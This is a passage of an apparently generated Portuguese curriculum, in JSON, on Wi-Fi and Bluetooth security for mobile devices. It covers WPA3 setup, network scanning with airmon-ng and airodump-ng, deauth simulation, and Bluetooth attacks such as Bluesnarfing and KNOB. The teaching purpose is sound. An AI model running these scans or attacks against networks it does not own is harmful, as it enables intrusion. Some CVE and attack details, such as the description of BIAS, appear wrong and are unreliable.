                                "Ética em Cibersegurança: Demonstrações éticas de ataques.",
                                "Análise de Dados: Interpretação de capturas Wireshark."
                              ],
                              "realWorldApplication": "Ao viajar, use este conhecimento para evitar conexões em aeroportos/hotéis públicos, optando por VPNs e verificando APs conhecidas, prevenindo roubo de dados em apps sensíveis como banking ou email em Android/iOS."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.4.1.2",
                            "name": "Configurar protocolos seguros WPA2/WPA3",
                            "description": "Implementar e verificar configurações de WPA3-Personal e Enterprise em roteadores e dispositivos móveis, comparando com WPA2 e identificando migrações seguras.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender e Comparar Protocolos WPA2 e WPA3",
                                  "subSteps": [
                                    "Pesquise as diferenças chave entre WPA2 (AES-CCMP) e WPA3 (SAE para Personal, 192-bit para Enterprise).",
                                    "Identifique vulnerabilidades do WPA2, como ataques KRACK e dictionary attacks em WPA2-PSK.",
                                    "Estude os benefícios do WPA3: handshake SAE resistente a offline attacks e forward secrecy.",
                                    "Revise requisitos de hardware: dispositivos compatíveis com WPA3.",
                                    "Documente uma tabela comparativa de segurança, performance e compatibilidade."
                                  ],
                                  "verification": "Criar e revisar uma tabela comparativa precisa submetida para aprovação.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "Computador com acesso à internet",
                                    "Documentos oficiais IEEE 802.11",
                                    "Ferramentas de notas como Notion ou Google Docs"
                                  ],
                                  "tips": "Use fontes confiáveis como Wi-Fi Alliance e NIST para evitar desinformação.",
                                  "learningObjective": "Diferenciar características de segurança WPA2 vs WPA3 e identificar cenários de migração.",
                                  "commonMistakes": [
                                    "Confundir WPA3-Personal com Enterprise",
                                    "Ignorar compatibilidade backward com WPA2",
                                    "Subestimar necessidade de hardware recente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar WPA3-Personal em um Roteador",
                                  "subSteps": [
                                    "Acesse a interface web do roteador (ex: 192.168.0.1) via navegador.",
                                    "Navegue para configurações Wi-Fi > Segurança e selecione WPA3-Personal ou WPA2/WPA3 Mixed.",
                                    "Gere e insira uma senha forte (mínimo 12 caracteres, com mix de tipos).",
                                    "Salve configurações e reinicie o roteador.",
                                    "Confirme o SSID broadcast com WPA3 ativo via scan de rede."
                                  ],
                                  "verification": "Scan de rede em outro dispositivo mostra rede com WPA3 suportado.",
                                  "estimatedTime": "30 minutes",
                                  "materials": [
                                    "Roteador compatível WPA3 (ex: TP-Link Archer C80)",
                                    "Computador ou laptop para acesso admin",
                                    "Cabo Ethernet para conexão inicial"
                                  ],
                                  "tips": "Desative WPS durante configuração para evitar vulnerabilidades.",
                                  "learningObjective": "Implementar WPA3-Personal com senha segura em roteador doméstico/empresarial.",
                                  "commonMistakes": [
                                    "Usar senha fraca ou reutilizada",
                                    "Não reiniciar roteador após mudanças",
                                    "Esquecer de desabilitar modos legados desnecessários"
                                  ]
                                },
                                {
                                  "stepNumber": "3",
                                  "title": "Configurar e Conectar Dispositivos Móveis a WPA3-Personal",
                                  "subSteps": [
                                    "No dispositivo móvel (Android/iOS recente), vá para Configurações > Wi-Fi e selecione o SSID.",
                                    "Insira a senha WPA3 e conecte; observe ícone de segurança.",
                                    "Teste conectividade: ping para roteador e internet externa.",
                                    "Verifique logs do roteador para autenticação bem-sucedida.",
                                    "Teste desconexão/reconexão múltiplas vezes para estabilidade."
                                  ],
                                  "verification": "Dispositivo móvel conectado com throughput normal e sem erros de autenticação nos logs.",
                                  "estimatedTime": "25 minutes",
                                  "materials": [
                                    "Smartphone ou tablet compatível WPA3",
                                    "Roteador configurado do Step 2"
                                  ],
                                  "tips": "Atualize firmware do dispositivo móvel para suporte WPA3 completo.",
                                  "learningObjective": "Garantir conectividade segura de dispositivos móveis em rede WPA3-Personal.",
                                  "commonMistakes": [
                                    "Dispositivos legacy sem suporte WPA3",
                                    "Erros de digitação na senha",
                                    "Ignorar atualizações de SO móvel"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar WPA3-Enterprise Básico e Planejar Migração",
                                  "subSteps": [
                                    "Configure um servidor RADIUS simples (ex: FreeRADIUS em VM ou pfSense).",
                                    "No roteador, mude para WPA3-Enterprise, insira IP/segredo do RADIUS.",
                                    "Crie contas de usuário no RADIUS e teste autenticação com dispositivo móvel.",
                                    "Planeje migração: fase 1 mixed mode WPA2/WPA3, fase 2 full WPA3.",
                                    "Documente passos de rollback caso de falhas de compatibilidade."
                                  ],
                                  "verification": "Autenticação EAP bem-sucedida via RADIUS e plano de migração documentado.",
                                  "estimatedTime": "60 minutes",
                                  "materials": [
                                    "Servidor RADIUS (VM com FreeRADIUS)",
                                    "Roteador enterprise-grade (ex: Ubiquiti UniFi)",
                                    "Certificados para EAP-TLS opcional"
                                  ],
                                  "tips": "Comece com EAP-PEAP para simplicidade antes de EAP-TLS.",
                                  "learningObjective": "Implementar WPA3-Enterprise e estratégias seguras de migração de WPA2.",
                                  "commonMistakes": [
                                    "Configuração incorreta de segredo RADIUS",
                                    "Firewall bloqueando portas UDP 1812/1813",
                                    "Subestimar tempo de testes em produção"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar e Testar Segurança das Configurações",
                                  "subSteps": [
                                    "Use Wireshark para capturar tráfego e confirmar handshake SAE sem leaks.",
                                    "Teste força de senha com ferramentas como Aircrack-ng (em lab controlado).",
                                    "Scan rede com Nmap ou WiFi Analyzer para expor SSID/encriptação.",
                                    "Simule ataques: deauth e tente reconexão para verificar resiliência.",
                                    "Gere relatório de conformidade com melhores práticas Wi-Fi Alliance."
                                  ],
                                  "verification": "Relatório confirma ausência de vulnerabilidades WPA2-style e WPA3 ativo.",
                                  "estimatedTime": "40 minutes",
                                  "materials": [
                                    "Wireshark",
                                    "Kali Linux VM para testes",
                                    "WiFi Analyzer app"
                                  ],
                                  "tips": "Realize testes apenas em redes isoladas para evitar impactos legais.",
                                  "learningObjective": "Validar implementações WPA3 contra ameaças reais e identificar migrações seguras.",
                                  "commonMistakes": [
                                    "Testes em redes de produção",
                                    "Interpretar falsos positivos em scans",
                                    "Esquecer de limpar evidências de testes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma pequena empresa, configure um roteador Ubiquiti UniFi com WPA3-Personal para a rede de visitantes móveis, migrando gradualmente de WPA2 para proteger acessos a dados sensíveis via smartphones de funcionários.",
                              "finalVerifications": [
                                "Rede Wi-Fi exibe WPA3 em scans de terceiros.",
                                "Dispositivos móveis conectam sem downgrades para WPA2.",
                                "Logs RADIUS mostram autenticações EAP seguras.",
                                "Testes de penetração confirmam resistência a dictionary/offline attacks.",
                                "Plano de migração documentado com timeline e rollback.",
                                "Throughput e latência comparáveis ou melhores que WPA2."
                              ],
                              "assessmentCriteria": [
                                "Precisão na comparação WPA2/WPA3 (90%+ cobertura de diferenças chave).",
                                "Configurações implementadas sem erros de sintaxe ou segurança.",
                                "Conectividade testada em ≥3 dispositivos móveis variados.",
                                "Relatório de verificação inclui capturas Wireshark e scans Nmap.",
                                "Plano de migração aborda compatibilidade e riscos.",
                                "Tempo total dentro de 3 horas, demonstrando eficiência."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Handshakes SAE e AES-256 (Matemática Computacional).",
                                "Administração de Redes: Configuração RADIUS e VLANs (Redes de Computadores).",
                                "Segurança Física: Controle de acesso Wi-Fi em ambientes móveis (Segurança Física).",
                                "Gestão de Projetos: Planejamento de migração em fases (Gestão de TI)."
                              ],
                              "realWorldApplication": "Em organizações como bancos ou hospitais, WPA3 protege comunicações móveis sensíveis contra eavesdropping em hotspots públicos, reduzindo riscos de breaches de dados durante migrações de infraestrutura legacy."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.4.1.3",
                            "name": "Usar ferramentas de detecção de redes inseguras",
                            "description": "Aplicar ferramentas como Wireshark, Aircrack-ng e apps móveis (ex: WiFi Analyzer) para escanear e detectar redes Wi-Fi vulneráveis em cenários móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Configurar Ferramentas de Detecção",
                                  "subSteps": [
                                    "Baixar e instalar Wireshark do site oficial (wireshark.org)",
                                    "Instalar Aircrack-ng via gerenciador de pacotes (apt install aircrack-ng no Linux) ou binários oficiais",
                                    "Instalar app WiFi Analyzer no smartphone Android via Google Play",
                                    "Verificar compatibilidade do adaptador WiFi para modo monitor (ex: Atheros AR9271)",
                                    "Executar comandos de teste: wireshark -v, airodump-ng --help, abrir app no celular"
                                  ],
                                  "verification": "Todas as ferramentas iniciam sem erros e comandos básicos funcionam.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Computador com adaptador WiFi compatível",
                                    "Smartphone Android",
                                    "Conexão à internet"
                                  ],
                                  "tips": "Use uma máquina virtual para isolar testes e evitar conflitos com rede principal.",
                                  "learningObjective": "Preparar um ambiente funcional para detecção segura de redes Wi-Fi.",
                                  "commonMistakes": [
                                    "Falhar em instalar drivers Npcap/WinPcap para Wireshark",
                                    "Ignorar requisitos de root/admin para Aircrack-ng",
                                    "Não ativar localização no app móvel"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Realizar Escaneamento Inicial com WiFi Analyzer",
                                  "subSteps": [
                                    "Ativar WiFi e localização no smartphone",
                                    "Abrir WiFi Analyzer e selecionar modo de escaneamento",
                                    "Visualizar lista de redes próximas com detalhes de sinal, canal e segurança",
                                    "Identificar redes abertas, WEP ou WPA desatualizadas",
                                    "Salvar ou capturar tela dos resultados principais"
                                  ],
                                  "verification": "Captura de tela mostrando pelo menos 5 redes com tipos de criptografia indicados.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Smartphone com WiFi Analyzer instalado"
                                  ],
                                  "tips": "Mova-se pelo ambiente para capturar variações de sinal e cobertura.",
                                  "learningObjective": "Usar ferramentas móveis para detecção rápida de vulnerabilidades Wi-Fi.",
                                  "commonMistakes": [
                                    "Desconsiderar redes com sinal fraco",
                                    "Confundir WPA2 com WPA3",
                                    "Não notar sobrecarga de canais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Capturar Pacotes de Rede com Wireshark",
                                  "subSteps": [
                                    "Abrir Wireshark e selecionar interface WiFi",
                                    "Habilitar modo promiscuo ou monitor (se suportado)",
                                    "Iniciar captura e aguardar 5-10 minutos em ambiente com redes",
                                    "Aplicar filtros como 'wlan.fc.type_subtype == 0x04' para beacons",
                                    "Parar captura e salvar arquivo .pcap"
                                  ],
                                  "verification": "Arquivo .pcap contém beacons de pelo menos 3 redes com metadados analisáveis.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Wireshark instalado",
                                    "Adaptador WiFi compatível com modo monitor"
                                  ],
                                  "tips": "Feche outros apps que usem WiFi para evitar interferências na captura.",
                                  "learningObjective": "Capturar e filtrar tráfego Wi-Fi para análise inicial de segurança.",
                                  "commonMistakes": [
                                    "Não habilitar modo monitor",
                                    "Usar filtros incorretos levando a dados vazios",
                                    "Capturar em rede própria sem permissão"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar Escaneamento Avançado com Aircrack-ng",
                                  "subSteps": [
                                    "Executar 'airmon-ng start wlan0' para criar interface monitor (mon0)",
                                    "Rodar 'airodump-ng mon0' para listar redes",
                                    "Anotar BSSID, ESSID, canal, potência e tipo de criptografia",
                                    "Procurar indícios de WPS ativo ou handshakes capturáveis",
                                    "Salvar scan em arquivo CSV e parar com Ctrl+C"
                                  ],
                                  "verification": "Arquivo de scan lista redes com detalhes como cripto WEP/WPA e canais.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Linux com Aircrack-ng",
                                    "Adaptador em modo monitor"
                                  ],
                                  "tips": "Mate processos interferentes com 'airmon-ng check kill' antes de iniciar.",
                                  "learningObjective": "Aplicar ferramentas de pentest para detecção detalhada de fraquezas Wi-Fi.",
                                  "commonMistakes": [
                                    "Selecionar interface errada",
                                    "Executar sem privilégios root",
                                    "Interpretar erroneamente criptografias híbridas"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar Resultados e Gerar Relatório de Vulnerabilidades",
                                  "subSteps": [
                                    "Compilar dados de WiFi Analyzer, Wireshark e Aircrack-ng",
                                    "Classificar redes: inseguras (abertas/WEP), moderadas (WPA2), seguras (WPA3)",
                                    "Documentar riscos como eavesdropping ou deauth attacks",
                                    "Recomendar mitigações (ex: usar VPN em redes fracas)",
                                    "Criar relatório em texto ou Markdown com evidências"
                                  ],
                                  "verification": "Relatório identifica 3+ redes vulneráveis com justificativas e screenshots.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Dados coletados das ferramentas anteriores",
                                    "Editor de texto"
                                  ],
                                  "tips": "Priorize redes públicas ou desconhecidas para análise ética.",
                                  "learningObjective": "Interpretar dados multifonte para decisões de segurança móvel.",
                                  "commonMistakes": [
                                    "Subestimar riscos de WPA2 com TKIP",
                                    "Omitir contexto legal/ético",
                                    "Não correlacionar dados entre ferramentas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um café lotado, use WiFi Analyzer no celular para detectar a rede 'CafeFreeWiFi' aberta sem criptografia; com Wireshark, capture beacons confirmando ausência de autenticação; Aircrack-ng revela canal 6 sobrecarregado e WPS desabilitado mas vulnerável a brute-force. Conclua que é insegura para transações móveis, recomendando VPN.",
                              "finalVerifications": [
                                "Lista precisa de redes detectadas com tipos de segurança",
                                "Identificação correta de pelo menos 3 vulnerabilidades comuns (aberta, WEP, WPA fraca)",
                                "Explicação clara de riscos associados a cada rede",
                                "Sugestões práticas de mitigações",
                                "Demonstração ética do uso de todas as ferramentas",
                                "Relatório consolidado com evidências visuais"
                              ],
                              "assessmentCriteria": [
                                "Precisão na classificação de protocolos de segurança Wi-Fi",
                                "Domínio correto de modos monitor e filtros de captura",
                                "Análise integrada de dados de múltiplas ferramentas",
                                "Relatório estruturado, claro e acionável",
                                "Consideração de limitações técnicas e legais das ferramentas",
                                "Adesão a práticas éticas (sem tentativas de cracking ilegal)"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos IEEE 802.11 e frames de management",
                                "Programação: Automatização de scans com scripts Bash/Python",
                                "Ética e Cidadania Digital: Regulamentações sobre varredura de redes (ex: LGPD)",
                                "Matemática: Estatísticas de sinal RSSI e análise de canais",
                                "Física: Propagação de ondas de rádio em 2.4/5GHz"
                              ],
                              "realWorldApplication": "Profissionais de cibersegurança usam essas ferramentas para auditar redes Wi-Fi corporativas em ambientes móveis, identificando hotspots vulneráveis em escritórios remotos ou eventos, prevenindo brechas como roubo de dados em conferências ou acessos não autorizados em redes de visitantes."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.4.2",
                        "name": "Segurança em Bluetooth para Dispositivos Móveis",
                        "description": "Proteções contra vulnerabilidades em comunicações Bluetooth, incluindo pareamento inseguro, eavesdropping e exploits como Bluejacking e Bluesnarfing.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.4.2.1",
                            "name": "Identificar vulnerabilidades Bluetooth clássicas e BLE",
                            "description": "Descrever ataques como Bluesnarfing, Bluebugging, KNOB e BIAS em Bluetooth Low Energy (BLE) usado em wearables e IoT móvel.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Bluetooth Clássico e BLE",
                                  "subSteps": [
                                    "Estude a arquitetura do Bluetooth Clássico (BR/EDR) e suas camadas principais (L2CAP, RFCOMM, SDP).",
                                    "Compare com Bluetooth Low Energy (BLE), focando em GATT, ATT e perfis como HID para wearables.",
                                    "Identifique diferenças chave: alcance, consumo de energia e modos de pareamento (Legacy vs Secure Simple Pairing).",
                                    "Revise o processo de descoberta de dispositivos e pareamento em ambos os protocolos.",
                                    "Anote exemplos de uso em IoT móvel e wearables (ex: smartwatches, sensores fitness)."
                                  ],
                                  "verification": "Crie um diagrama comparativo entre Bluetooth Clássico e BLE, listando 5 diferenças principais.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentação oficial Bluetooth SIG, Wireshark com plugin Bluetooth, vídeo tutoriais no YouTube (Bluetooth Basics).",
                                  "tips": "Use diagramas visuais para mapear pilhas de protocolos; foque em como o pareamento falho cria janelas de ataque.",
                                  "learningObjective": "Diferenciar Bluetooth Clássico de BLE e entender pré-condições para vulnerabilidades.",
                                  "commonMistakes": "Confundir BLE com Bluetooth Clássico; ignorar evolução do SSP (Secure Simple Pairing)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Vulnerabilidades Clássicas: Bluesnarfing e Bluebugging",
                                  "subSteps": [
                                    "Descreva Bluesnarfing: acesso não autorizado a dados via OBEX Push sobre RFCOMM sem autenticação.",
                                    "Explique Bluebugging: hijacking de comandos AT via RFComm para controle total do dispositivo.",
                                    "Estude PoCs históricos (ex: ferramentas como hc bluesnarf, btscanner).",
                                    "Simule em ambiente controlado com VMs ou dispositivos antigos (ex: Nokia 6600).",
                                    "Liste impactos: roubo de contatos, SMS, chamadas e execução de comandos."
                                  ],
                                  "verification": "Escreva um relatório de 1 página descrevendo mecanismos de ataque e CVEs associados (ex: CVE-2004-2366).",
                                  "estimatedTime": "3 horas",
                                  "materials": "Ferramentas: BlueZ no Linux, hciconfig, sdptool; relatórios de vulnerabilidades (Kr0ptkin papers).",
                                  "tips": "Instale BlueZ em Kali Linux; teste apenas em labs isolados para evitar legal issues.",
                                  "learningObjective": "Explicar precisamente como Bluesnarfing e Bluebugging exploram falhas no pareamento clássico.",
                                  "commonMistakes": "Achar que esses ataques foram erradicados; subestimar dispositivos legados ainda vulneráveis."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Vulnerabilidades em BLE: KNOB e BIAS",
                                  "subSteps": [
                                    "Estude KNOB (CVE-2019-9506): negociação de chave fraca durante SSP, reduzindo entropia para 1 byte.",
                                    "Descreva BIAS (CVE-2019-19055): bias em gerador de chaves LTK levando a recuperação via lattice attacks.",
                                    "Analise impactos em BLE para wearables/IoT: eavesdropping, decrypt de tráfego em smartbands.",
                                    "Revise mitigações: Bluetooth 5.0+ com chaves de 128 bits mínimas e randomização melhorada.",
                                    "Capture pacotes BLE com Ubertooth ou nRF Sniffer para visualizar handshakes."
                                  ],
                                  "verification": "Capture e analise um handshake BLE, identificando pontos vulneráveis a KNOB/BIAS.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Hardware: Ubertooth One ou nRF52840 Dongle; software: Wireshark BLE plugin, BtleJack.",
                                  "tips": "Use apps como nRF Connect para simular dispositivos BLE; foque em logs de negociação de chaves.",
                                  "learningObjective": "Identificar vetores de ataque KNOB e BIAS em cenários BLE modernos.",
                                  "commonMistakes": "Ignorar que BLE usa SSP similar ao Clássico; confundir com ataques de relay."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Conhecimento a Wearables e IoT Móvel",
                                  "subSteps": [
                                    "Mapeie vulnerabilidades para dispositivos reais: Bluesnarfing em fones antigos, KNOB em Fitbits.",
                                    "Avalie riscos em cenários móveis: proximidade em transporte público, apps companion.",
                                    "Discuta detecção: scanning com ferramentas como BlueHydra ou BLE Scanner apps.",
                                    "Planeje mitigação: pinning de certificados, atualizações firmware, Just Works avoidance.",
                                    "Crie checklist para auditoria de dispositivos Bluetooth em IoT."
                                  ],
                                  "verification": "Audite 2 dispositivos reais (ex: smartwatch), listando riscos identificados e recomendações.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "Dispositivos: smartwatch/Fitbit; apps: LightBlue, Bluetooth Scanner; checklists NIST SP 800-97.",
                                  "tips": "Teste em modo discoverable; documente MAC addresses e perfis expostos.",
                                  "learningObjective": "Conectar vulnerabilidades teóricas a aplicações práticas em wearables/IoT.",
                                  "commonMistakes": "Focar só em teoria sem exemplos reais; negligenciar BLE advertising packets."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar Identificação e Verificação Final",
                                  "subSteps": [
                                    "Simule ataques em lab virtual (ex: usando QEMU com Bluetooth ou Renode para IoT).",
                                    "Identifique vulnerabilidades em tráfego capturado: procure chaves fracas ou serviços expostos.",
                                    "Crie fluxogramas de ataques para cada vulnerabilidade.",
                                    "Teste defesas: configure dispositivos com Secure Connections Only.",
                                    "Autoavalie com quiz: descreva 4 ataques em <5 min."
                                  ],
                                  "verification": "Grave vídeo de 3 min demonstrando identificação de uma vulnerabilidade em captura real.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Lab: GNS3 com Bluetooth emuladores, PoC scripts GitHub (KNOB attack repo).",
                                  "tips": "Use VPN/firewall para isolar lab; pratique com múltiplos cenários.",
                                  "learningObjective": "Demonstrar proficiência em identificar todas as vulnerabilidades listadas.",
                                  "commonMistakes": "Simular sem captura real; pular verificações de mitigação."
                                }
                              ],
                              "practicalExample": "Em um smartwatch como Apple Watch Series 3 (BLE), capture o handshake durante pareamento com nRF Sniffer. Identifique negociação KNOB se a chave for <7 bytes, demonstre decrypt de dados GATT (ex: heart rate) e aplique mitgação forçando Bluetooth 5.0 Secure Connections.",
                              "finalVerifications": [
                                "Lista corretamente Bluesnarfing, Bluebugging, KNOB e BIAS com mecanismos exatos.",
                                "Explica impactos em wearables/IoT com exemplos reais (ex: Fitbit data leak).",
                                "Capture e analisa tráfego Bluetooth mostrando pontos vulneráveis.",
                                "Propõe 3 mitigações por vulnerabilidade (ex: disable legacy pairing).",
                                "Audita dispositivo real identificando pelo menos 2 riscos BLE.",
                                "Cria fluxograma de ataque KNOB/BIAS."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: 100% acerto nos mecanismos de ataque (30%)",
                                "Profundidade de análise: inclui CVEs, PoCs e capturas (25%)",
                                "Aplicação prática: exemplos em wearables/IoT (20%)",
                                "Mitigações propostas: viáveis e atualizadas (15%)",
                                "Clareza na comunicação: diagramas/relatórios bem estruturados (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Entender negociação de chaves e ataques de entropia baixa.",
                                "Redes Sem Fio: Comparar com Wi-Fi WPA3 e Zigbee vulnerabilidades.",
                                "Hardware/IoT: Integração com sensores em dispositivos embarcados.",
                                "Ética em Cibersegurança: Responsabilidades em pentesting Bluetooth."
                              ],
                              "realWorldApplication": "Auditar redes corporativas com wearables (ex: funcionários com smartwatches), prevenindo vazamento de dados biométricos via BIAS em BLE ou espionagem em IoT industrial móvel, reduzindo riscos em 80% com patching e políticas de pareamento seguro."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.4.2.2",
                            "name": "Implementar pareamento seguro e criptografia",
                            "description": "Configurar Secure Simple Pairing (SSP) e Secure Connections em dispositivos móveis, verificando chaves de 128-bit AES e mitigando downgrade attacks.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Secure Simple Pairing (SSP) e Secure Connections",
                                  "subSteps": [
                                    "Estude a especificação Bluetooth Core 4.0+ para SSP, incluindo modos Numeric Comparison, Passkey Entry e Out of Band.",
                                    "Revise Secure Connections do Bluetooth 4.2, focando em elliptic curve Diffie-Hellman (ECDH) para autenticação.",
                                    "Identifique diferenças entre Legacy Pairing e SSP/Secure Connections.",
                                    "Analise vulnerabilidades como downgrade attacks e como SSP as previne.",
                                    "Leia documentação oficial do Bluetooth SIG sobre chaves AES-128."
                                  ],
                                  "verification": "Resuma em um diagrama os fluxos de pareamento SSP vs. Secure Connections e liste 3 diferenças chave.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação Bluetooth SIG (bluetooth.com), Wireshark com Bluetooth plugin, laptop com Bluetooth.",
                                  "tips": "Use diagramas visuais para mapear associações de chaves; foque em P-256 para ECDH.",
                                  "learningObjective": "Explicar mecanismos de pareamento seguro e suas evoluções.",
                                  "commonMistakes": "Confundir SSP com Legacy Pairing; ignorar requisitos de Bluetooth versão."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Secure Simple Pairing (SSP) em Dispositivos Móveis",
                                  "subSteps": [
                                    "Habilite desenvolvedor mode em dois dispositivos Android/iOS.",
                                    "Use BluetoothGatt API (Android) ou CoreBluetooth (iOS) para iniciar pareamento SSP.",
                                    "Implemente código para Numeric Comparison ou Passkey Entry.",
                                    "Configure políticas de pareamento para exigir SSP apenas.",
                                    "Teste pareamento inicial entre dois dispositivos."
                                  ],
                                  "verification": "Registre logs do pareamento confirmando modo SSP (ex: 'SSP Numeric Comparison') sem erros.",
                                  "estimatedTime": "1 hora",
                                  "materials": "Dois smartphones Android/iOS, Android Studio/Xcode, código de exemplo BluetoothChat.",
                                  "tips": "Sempre pare dispositivos próximos para evitar timeouts; use adb logcat para debug.",
                                  "learningObjective": "Implementar SSP programaticamente em apps móveis.",
                                  "commonMistakes": "Não habilitar bonding após pareamento; usar modos legados por default."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Secure Connections e Verificar Chaves AES-128",
                                  "subSteps": [
                                    "Atualize firmware Bluetooth para suportar 4.2+ em dispositivos.",
                                    "Modifique app para forçar Secure Connections via setConnectionPolicy.",
                                    "Capture tráfego Bluetooth com Wireshark e extraia chaves LTK/STK.",
                                    "Verifique comprimento e força da chave AES-128 (128 bits, 16 bytes).",
                                    "Confirme uso de ECDH P-256 para geração de chaves."
                                  ],
                                  "verification": "Exporte chaves de sessão e confirme via ferramenta como BTP (Bluetooth Testing Platform) que são AES-128.",
                                  "estimatedTime": "1 hora 30 minutos",
                                  "materials": "Wireshark com Ubertooth One, BTP tool, dispositivos com Bluetooth 4.2+.",
                                  "tips": "Calibre Ubertooth para capturas precisas; compare hashes de chaves esperados.",
                                  "learningObjective": "Validar criptografia de ponta a ponta com chaves fortes.",
                                  "commonMistakes": "Ignorar negociação de versão; assumir compatibilidade sem teste."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Mitigar Downgrade Attacks e Testar Configuração Completa",
                                  "subSteps": [
                                    "Simule downgrade forçando dispositivo legado e observe rejeição SSP.",
                                    "Implemente verificações de versão mínima no código (ex: requireSecureConnections).",
                                    "Teste cenários de ataque com ferramentas como GATTacker.",
                                    "Registre métricas de segurança: tempo de pareamento, força de chave.",
                                    "Documente política de segurança para rede móvel."
                                  ],
                                  "verification": "Execute teste de downgrade: pareamento falha se versão <4.2; logs mostram rejeição.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "GATTacker tool, dispositivo legado Bluetooth, scripts de teste.",
                                  "tips": "Automatize testes com scripts Python para repetibilidade.",
                                  "learningObjective": "Proteger contra ataques de downgrade em ambientes reais.",
                                  "commonMistakes": "Não testar com dispositivos mistos; subestimar latência em mitigações."
                                }
                              ],
                              "practicalExample": "Em um app de fitness wearable, configure SSP entre smartwatch Android Wear e smartphone para transmitir dados cardíacos criptografados, verificando AES-128 para prevenir eavesdropping durante corridas.",
                              "finalVerifications": [
                                "Pareamento SSP bem-sucedido com logs confirmando modo seguro.",
                                "Chaves AES-128 extraídas e validadas em Wireshark.",
                                "Tentativa de downgrade rejeitada automaticamente.",
                                "Transferência de dados Bluetooth sem vazamentos detectados.",
                                "Política de conexão força Secure Connections em todos os pares.",
                                "Teste de estresse: 10 pareamentos consecutivos sem falhas de segurança."
                              ],
                              "assessmentCriteria": [
                                "Compreensão conceitual: 25% (diagrama preciso de fluxos).",
                                "Implementação prática: 30% (código funcional sem erros de pareamento).",
                                "Verificação de chaves: 20% (AES-128 confirmado).",
                                "Mitigação de ataques: 15% (downgrade bloqueado).",
                                "Documentação: 10% (relatório claro com evidências)."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Aplicação de AES e ECDH em fundamentos matemáticos.",
                                "Programação Móvel: Integração com APIs Android/iOS.",
                                "Redes: Protocolos Bluetooth como extensão de segurança de rede.",
                                "Ética em TI: Privacidade de dados em dispositivos IoT."
                              ],
                              "realWorldApplication": "Proteger comunicações em smart homes (ex: lâmpadas Philips Hue pareadas com apps móveis), prevenindo roubo de dados em ataques MAN-IN-THE-MIDDLE durante controle remoto."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.4.2.3",
                            "name": "Auditar conexões Bluetooth com ferramentas",
                            "description": "Usar ferramentas como BlueHydra, Ubertooth e hcitool para monitorar e testar segurança de pareamentos Bluetooth em ambientes móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Ambiente e Instalar Ferramentas",
                                  "subSteps": [
                                    "Instale um sistema Linux compatível, como Kali Linux, em uma VM ou máquina física.",
                                    "Atualize o sistema com 'sudo apt update && sudo apt upgrade'.",
                                    "Instale dependências: 'sudo apt install bluetooth bluez libbluetooth-dev libpcap-dev'.",
                                    "Instale hcitool (parte do bluez), BlueHydra via git clone e build, e configure Ubertooth com firmware.",
                                    "Conecte e configure o hardware Ubertooth One e adapter Bluetooth compatível."
                                  ],
                                  "verification": "Execute 'hcitool dev' e 'bluehydra --check' para confirmar instalação e detecção de hardware.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Kali Linux",
                                    "Ubertooth One",
                                    "Adaptador Bluetooth USB",
                                    "Acesso root"
                                  ],
                                  "tips": [
                                    "Use uma VM com USB passthrough para hardware; teste em modo não-root primeiro."
                                  ],
